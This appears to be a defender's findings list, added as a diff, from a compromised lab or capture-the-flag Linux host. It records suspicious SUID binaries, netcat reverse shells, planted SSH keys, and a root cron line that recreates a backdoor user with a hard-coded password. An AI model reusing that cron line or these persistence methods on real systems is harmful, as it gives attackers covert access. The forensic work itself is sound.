@@ -1,0 +1,76 @@
+#1 SUID should be enabled for a limited set of executables
+[root@ip-172-31-37-68 ~]# find / -type f -perm /4000 2>/dev/null
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/staprun
+/usr/bin/passwd
+/usr/bin/crontab
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/chmod  <---------------------
+/usr/sbin/mount.nfs
+/usr/local/bin/falcon_root  <----------
+
+#2&3 Review all CRON jobs:  Historically batch focused and not very cloud native
+[root@ip-172-31-37-68 ~]# crontab -l
+*/5 * * * * id bear >/dev/null 2>&1 || (useradd -m bear && echo 'bear:SuperSecureP@ss!' | chpasswd)
+*/30 * * * * /var/log/shutdown.log >> /var/log/shutdown2.log 2>&1
+*/10 * * * * /var/log/lonely.log >> /var/log/lonely2.log 2>&1
+
+#4 outbound NC connected to a callback server for a reverse shell
+[root@ip-172-31-37-68 ~]# ss -tpl
+State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port   Process
+LISTEN   0        10               0.0.0.0:32123          0.0.0.0:*       users:(("nc",pid=18066,fd=4))
+LISTEN   0        5                0.0.0.0:49855          0.0.0.0:*       users:(("python3",pid=25987,fd=3))
+LISTEN   0        128              0.0.0.0:ssh            0.0.0.0:*       users:(("sshd",pid=3357,fd=3))
+LISTEN   0        511              0.0.0.0:http           0.0.0.0:*       users:(("nginx",pid=25943,fd=6),("nginx",pid=25942,fd=6))
+LISTEN   0        10                  [::]:32123             [::]:*       users:(("nc",pid=18066,fd=3))
+LISTEN   0        128                 [::]:ssh               [::]:*       users:(("sshd",pid=3357,fd=4))
+
+#5 Inbound NC allowed a reverse shell
+[root@ip-172-31-37-68 ~]# ss -tnp
+State        Recv-Q   Send-Q     Local Address:Port      Peer Address:Port   Process
+ESTAB        0        0           172.31.37.68:39748     172.31.35.48:33133   users:(("bash",pid=26433,fd=3),("nc",pid=26432,fd=3))
+ESTAB        0        0           172.31.37.68:53122      3.146.8.119:443     users:(("ssm-session-wor",pid=1639,fd=15))
+CLOSE-WAIT   2        0           172.31.37.68:46768     172.31.35.48:33133   users:(("nc",pid=26355,fd=3))
+ESTAB        0        0           172.31.37.68:55048      3.146.8.119:443     users:(("ssm-agent-worke",pid=1622,fd=17))
+
+#7 Replace nginx with openresty (unauthorized)
+The output of command "dnf list installed" should be compared to a known good manifest.
+
+#8&9 Configuration allowed both command injection and file uploads
+Review the nginx conf
+[root@ip-172-31-37-68 html]# find / -name "nginx.conf"
+/etc/nginx/nginx.conf
+/usr/local/openresty/nginx/conf/nginx.conf
+
+#10 Used chattr to slow down users and show file protections are more then 0x007
+
+#11 Running shell script is changing flag values
+[root@ip-172-31-37-68 flag]# ps aux | grep -E '(/bin/sh|/bin/bash|\.sh|\.bash)' | grep -v grep
+root       25949  0.0  0.3 223020  3632 ?        S    12:09   0:00 /bin/bash /usr/bin/fagne.sh
+
+#12 Private key login for any user to ssm-user account.  Note ssm-user does not use SSH
+root@ip-172-31-37-68 flag]# find /home -type f -name "authorized_keys" -exec sh -c 'ls -l "{}"' \;-rw-------. 1 ec2-user ec2-user 485 Dec  2 12:10 /home/ec2-user/.ssh/authorized_keys
+-rw-r--r--. 1 root root 2718 Dec  2 12:09 /home/ssm-user/.ssh/authorized_keys
+-rw-r--r--. 1 wooba wooba 774 Dec  2 12:09 /home/wooba/.ssh/authorized_keys
+-r-xr--r--. 1 root root 103 Dec  2 12:09 /home/kingfisher/.ssh/authorized_keys
+-rw-------. 1 shark shark 103 Dec  2 12:09 /home/shark/.ssh/authorized_keys
+-rw-------. 1 bear bear 747 Dec  2 12:09 /home/bear/.ssh/authorized_keys
+-r-xr--r--. 1 porcupine porcupine 262 Dec  2 12:09 /home/porcupine/.ssh/authorized_keys
+-rw-------. 1 hawk hawk 81 Dec  2 12:09 /home/hawk/.ssh/authorized_keys
+-r-xr--r--. 1 falcon falcon 262 Dec  2 12:09 /home/falcon/.ssh/authorized_keys
+
+
+
+
+
+
+
